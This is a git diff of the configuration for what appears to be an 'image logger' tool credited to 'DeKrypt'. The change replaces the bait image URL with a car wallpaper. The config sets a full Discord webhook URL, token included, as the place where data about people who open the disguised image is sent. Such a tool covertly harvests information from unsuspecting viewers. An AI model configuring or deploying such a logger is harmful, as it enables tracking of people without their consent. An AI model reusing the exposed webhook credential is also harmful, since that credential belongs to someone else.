@@ -11,7 +11,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1365334797232373904/7BwrJD_ALGOasqao_pa-i_jiydnZ-8esdyvZrUdMNn5mnNrVjSAMPqrCIuSghIv6W3tX",
-    "image": "https://discord.com/api/webhooks/1365334797232373904/7BwrJD_ALGOasqao_pa-i_jiydnZ-8esdyvZrUdMNn5mnNrVjSAMPqrCIuSghIv6W3tX", # You can also have a custom image by using a URL argument
+    "image": "https://wallup.net/wp-content/uploads/2016/01/290880-orange-BMW-car-German_car-BMW_M3_GTS.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
